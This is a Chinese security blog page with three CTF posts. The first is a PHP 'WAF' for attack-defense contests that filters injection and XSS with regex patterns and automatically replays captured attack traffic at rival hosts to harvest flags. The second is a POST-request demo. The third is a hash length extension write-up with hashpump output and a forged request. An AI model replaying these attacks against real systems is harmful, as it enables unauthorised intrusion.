<li>将远程的靶机添加到<code>waflog\ip.txt</code>，然后对本地靶机进行攻击。发现流量和flag存储在<code>waflog</code>文件夹下。当然也就可以自动提交flag根据不同比赛的发送流量。</li>
<li>本地flag是<code>flag{abc}</code>而远程的flag是<code>flag{I_wan_to_have_a_girlfriend}</code></li>
<li>发现flag.txt下保存了远程的flag</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/mycute/20190914/15684478947549.png" alt="img"></p>
<h2 id="成品代码"><a href="#成品代码" class="headerlink" title="成品代码"></a>成品代码</h2><pre><code class="php">&lt;?php
error_reporting(0);
class CTF_WAF{
    public $getfilter;
    public $postfilter;
    public $cookiefilter;
    public $url;
    public $dir;
    public $ip;
    public function __construct() {
         $this-&gt;getfilter = &quot;\\&lt;.+javascript:window\\[.{1}\\\\x|&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|\\b(group_)?concat[\\s\\/\\*]*?\\([^\\)]+?\\)|\bcase[\s\/\*]*?when[\s\/\*]*?\([^\)]+?\)|load_file\s*?\\()|&lt;[a-z]+?\\b[^&gt;]*?\\bon([a-z]{4,})\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))FROM(\\(.+\\)|\\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|&lt;.*(iframe|frame|style|embed|object|frameset|meta|xml|a|img)|hacker&quot;;
        //post拦截规则
        $this-&gt;postfilter = &quot;&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*data=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|\\b(group_)?concat[\\s\\/\\*]*?\\([^\\)]+?\\)|\bcase[\s\/\*]*?when[\s\/\*]*?\([^\)]+?\)|load_file\s*?\\()|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))FROM(\\(.+\\)|\\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|&lt;.*(iframe|frame|style|embed|object|frameset|meta|xml|a|img)|hacker&quot;;
        //cookie拦截规则
        $this-&gt;cookiefilter = &quot;benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\(|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)|UPDATE\s*(\(.+\)\s*|@{1,2}.+?\s*|\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;)\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))FROM(\\(.+\\)|\\s+?.+?|(`|&#39;|\&quot;).*?(`|&#39;|\&quot;))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;
        $this-&gt;url = &#39;http://&#39;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;REQUEST_URI&#39;];
        $this-&gt;dir = __DIR__.&#39;\\&#39;.&#39;waflog\\&#39;;
        $this-&gt;ip = [];
        $this-&gt;read_ip();

    }

    public function Flux($Value,$style){
                switch ($style) {
                    case &#39;post&#39;:
                        $this-&gt;Check_Flux($Value, $this-&gt;postfilter);
                        if(is_array($Value)){
                            $Value = http_build_query($Value);
                        }

                        $this-&gt;data_to_file(&quot;{\&quot;&quot;.$this-&gt;url.&quot;\&quot;:&quot;.&quot;\&quot;&quot;.$Value.&quot;\&quot;}&quot;,&quot;post.txt&quot;,&#39;post&#39;);
                        break;
                    case &#39;get&#39;:
                        $this-&gt;Check_Flux($Value, $this-&gt;getfilter);
                        if(is_array($Value)){
                            $Value = implode($Value);
                        }
                        $this-&gt;data_to_file($this-&gt;url.&quot;\r\n&quot;,&quot;get.txt&quot;,&#39;get&#39;);
                        break;
                    default:
                        $this-&gt;Check_Flux($Value, $this-&gt;cookiefilter);
                        if(is_array($Value)){
                            $Value = http_build_query($Value);
                        }

                        $this-&gt;data_to_file(&quot;{\&quot;&quot;.$this-&gt;url.&quot;\&quot;:&quot;.&quot;\&quot;&quot;.$Value.&quot;\&quot;}&quot;,&quot;cookie.txt&quot;,&#39;cookie&#39;);
                        break;
                }            
            }
    public function read_ip(){
        $file = fopen($this-&gt;dir.&quot;ip.txt&quot;, &quot;r&quot;) or exit(&quot;Unable to open file!&quot;);
        while(!feof($file))
        {
         array_push($this-&gt;ip, fgets($file));
        }
        fclose($file);
    }    

    public function Check_Flux($Value,$ArrFiltReq){
            if(is_array($Value)){
            $Value=implode($Value);
            }
            if (preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;,$Value)==1){
            die();
            }
        }

    public function Request_Post($data,$url){
        if(is_array($data)){
                $query = http_build_query($data); //使用给出的关联（或下标）数组生成一个经过 URL-encode 的请求字符串。
            }else{
                $query = $data;
            }
        $options[&#39;http&#39;] = array(
         &#39;timeout&#39;=&gt;60,
         &#39;method&#39; =&gt; &#39;POST&#39;,
         &#39;header&#39; =&gt; &#39;Content-type:application/x-www-form-urlencoded&#39;,
         &#39;content&#39; =&gt; $query
        );//构造一个post包

        $context = stream_context_create($options);//创建并返回一个资源流上下文
        $result = file_get_contents($url, false, $context);
        return $result; 
    }

    public function Request_Get($url){
        $result = file_get_contents($url);
         //var_dump($result);
        return $result; 
    }

    public function Get_Flag($result){
        if(stristr($result,&#39;flag&#39;)){
           preg_match_all(&#39;/flag{(.*?)}/&#39;, $result,$flag);
            $this-&gt;data_to_file($flag[0][0].&quot;\r\n&quot;,&quot;flag.txt&quot;,&#39;flag&#39;);
        }
    }

    public function data_to_file($data,$filename,$style=&#39;&#39;){
        if(is_array($data)){
            $data = implode($data);
        }
        switch ($style) {
            case &#39;post&#39;:
            //$jsonData = json_decode(&#39;[&#39;.file_get_contents(__DIR__.&#39;\\&#39;.$filename).&#39;]&#39;,true);
                if(!stristr(file_get_contents($this-&gt;dir.$filename),$data)){

                    if(file_exists($this-&gt;dir.$filename)){
                        file_put_contents($this-&gt;dir.$filename,&quot;,&quot;.$data,FILE_APPEND);    
                    }else{
                        file_put_contents($this-&gt;dir.$filename,$data,FILE_APPEND);
                    }
                    for($i=0;$i&lt;count($this-&gt;ip);$i++){
                        $this-&gt;Get_Flag($this-&gt;Request_Post(json_decode($data,true)[$this-&gt;url],&#39;http://&#39;.$this-&gt;ip[$i].&#39;/&#39;));
                    }
                }
                //var_dump($jsonData);
                break;
            case &#39;get&#39;:
             $js_data = $data;
                if(!stristr(file_get_contents($this-&gt;dir.$filename),str_replace(&#39;http://&#39;.$_SERVER[&#39;HTTP_HOST&#39;], &#39;&#39;, $data))){
                    file_put_contents($this-&gt;dir.$filename, $js_data ,FILE_APPEND);
                    for($i=0;$i&lt;count($this-&gt;ip);$i++){
                    $this-&gt;Get_Flag($this-&gt;Request_Get(str_replace(&quot;\r\n&quot;,&quot;&quot;,str_replace($_SERVER[&#39;HTTP_HOST&#39;], $this-&gt;ip[$i], $data))));
                    }
                }
                break;
            case &#39;cookie&#39;:
                if(!stristr(file_get_contents($this-&gt;dir.$filename),$data)){
                    if(file_exists($this-&gt;dir.$filename)){
                        file_put_contents($this-&gt;dir.$filename,&quot;,&quot;.$data,FILE_APPEND);    
                    }else{
                        file_put_contents($this-&gt;dir.$filename,$data,FILE_APPEND);
                    }
                }
                break;
            case &#39;flag&#39;:
                if(!stristr(file_get_contents($this-&gt;dir.$filename),$data)){
                    file_put_contents($this-&gt;dir.$filename,$data,FILE_APPEND);
                }
                break;
        }
    }
}


/*******************************/
/*         调用WAF            */

$waf = new  CTF_WAF();

if(isset($_GET)){
    $waf-&gt;Flux($_GET,&#39;get&#39;);
}

if(isset($_POST)){
    $waf-&gt;Flux($_POST,&#39;post&#39;);
}

foreach($_COOKIE as $key=&gt;$value){
    $waf-&gt;Flux($value,&#39;cookie&#39;);

}</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d7da57127d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/d7da57127d.html" class="post-title-link" itemprop="url">PHP中file_get_contents()函数去实现POST发送</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-09-13 23:27:32" itemprop="dateCreated datePublished" datetime="2019-09-13T23:27:32+08:00">2019-09-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-05-12 19:00:04" itemprop="dateModified" datetime="2020-05-12T19:00:04+08:00">2020-05-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>749</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要打CTF的线下赛，写了个脚本作为WAF拦截流量并作流量转发。正好研究一下PHP如何使用file_get_contens()去发送POST包。正好中秋节无聊得爆炸，去年执行任务在火车上过了个中秋，今年回到地方，老友们都回家了，宿舍也是空无一人，其实就算宿舍有人也是一样，兴趣爱好不一样，自己也沉迷于技术研究，不玩游戏，不看球的。</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><pre><code class="php">&lt;?php
$data = array(
    &#39;username&#39;=&gt;&#39;admin&#39;,
    &#39;password&#39;=&gt;&#39;hplocation123*&#39;
    ); 

$query = http_build_query($data); //使用给出的关联（或下标）数组生成一个经过 URL-encode 的请求字符串。

$options[&#39;http&#39;] = array(
     &#39;timeout&#39;=&gt;60,
     &#39;method&#39; =&gt; &#39;POST&#39;,
     &#39;header&#39; =&gt; &#39;Content-type:application/x-www-form-urlencoded&#39;,
     &#39;content&#39; =&gt; $query
    );//构造一个post包

$url = &quot;http://point.mycute.cn/login.php&quot;;
$context = stream_context_create($options);//创建并返回一个资源流上下文
$result = file_get_contents($url, false, $context);

echo htmlspecialchars($result);
?&gt;</code></pre>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/1559adf164.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/header.jpg">
      <meta itemprop="name" content="XiaoLeung">
      <meta itemprop="description" content="随笔、分享、记录生活">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Xiao Leung's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/articles/1559adf164.html" class="post-title-link" itemprop="url">Hash长度扩展攻击学习笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-09-12 17:33:48" itemprop="dateCreated datePublished" datetime="2019-09-12T17:33:48+08:00">2019-09-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-10-14 17:23:02" itemprop="dateModified" datetime="2020-10-14T17:23:02+08:00">2020-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p> <a href="http://ctf5.shiyanbar.com/web/kzhan.php" target="_blank" rel="noopener">实验吧：让我进去</a></p>
<h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre><code class="php">$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;
$secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!

$username = $_POST[&quot;username&quot;];
$password = $_POST[&quot;password&quot;];

if (!empty($_COOKIE[&quot;getmein&quot;])) {
    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {
        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {
            echo &quot;Congratulations! You are a registered user.\n&quot;;
            die (&quot;The flag is &quot;. $flag);
        }
        else {
            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);
        }
    }
    else {
        die (&quot;You are not an admin! LEAVE.&quot;);
    }
}

setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));

if (empty($_COOKIE[&quot;source&quot;])) {
    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));
}
else {
    if ($_COOKIE[&quot;source&quot;] != 0) {
        echo &quot;&quot;; // This source code is outputted here
    }
}

$username = $_POST[&quot;username&quot;];
$password = $_POST[&quot;password&quot;];

if (!empty($_COOKIE[&quot;getmein&quot;])) {
    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {
        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {
            echo &quot;Congratulations! You are a registered user.\n&quot;;
            die (&quot;The flag is &quot;. $flag);
        }
        else {
            die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);
        }
    }
    else {
        die (&quot;You are not an admin! LEAVE.&quot;);
    }
}

setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));

if (empty($_COOKIE[&quot;source&quot;])) {
    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));
}
else {
    if ($_COOKIE[&quot;source&quot;] != 0) {
        echo &quot;&quot;; // This source code is outputted here
    }
}</code></pre>
<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><ul>
<li><strong>HASHPUMP：</strong></li>
</ul>
<pre><code class="shell">root@kali:~# hashpump
Input Signature: 571580b26c65f306376d4f64e53cb5c7
Input Data: admin
Input Key Length: 20
Input Data to Add: admin
e18dfd8404515016d3aeeea2aa196909
admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin</code></pre>
<ul>
<li><strong>构造payload</strong></li>
</ul>
<pre><code>POST /web/kzhan.php HTTP/1.1
Host: ctf5.shiyanbar.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 151
Connection: close
Referer: http://ctf5.shiyanbar.com/web/kzhan.php
Cookie: sample-hash=571580b26c65f306376d4f64e53cb5c7; source=1;getmein=e18dfd8404515016d3aeeea2aa196909; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1567956475; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*214456%2CnickName%3Agqleung
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1

username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00admin</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190912/15682801246486.png" alt="img"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="XiaoLeung"
      src="/header.jpg">
  <p class="site-author-name" itemprop="name">XiaoLeung</p>
  <div class="site-description" itemprop="description">随笔、分享、记录生活</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">75</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://www.redmango.top/" title="https://www.redmango.top/" rel="noopener" target="_blank">HhhM</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://l1near.top/" title="https://l1near.top/" rel="noopener" target="_blank">L1nearのspace</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.mrskye.cn/" title="https://www.mrskye.cn/" rel="noopener" target="_blank">SkYe's Blog</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.kawhi.xyz" title="https://www.kawhi.xyz" rel="noopener" target="_blank">kawhi</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="https://beian.miit.gov.cn" rel="noopener" target="_blank">粤ICP备18132442号-1 </a>
      <img src="/gongan.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" rel="noopener" target="_blank">粤公网安备 44011202000643号 </a>
  </div>

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">XiaoLeung</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">282k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">4:17</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        


  <div style="display: none;">
    <script src="//s95.cnzz.com/z_stat.php?id=true&web_id=true"></script>
  </div>






      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
<script src="/js/schemes/pisces.js"></script>
<script src="/js/next-boot.js"></script>



  




  <script src="/js/local-search.js"></script>












  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
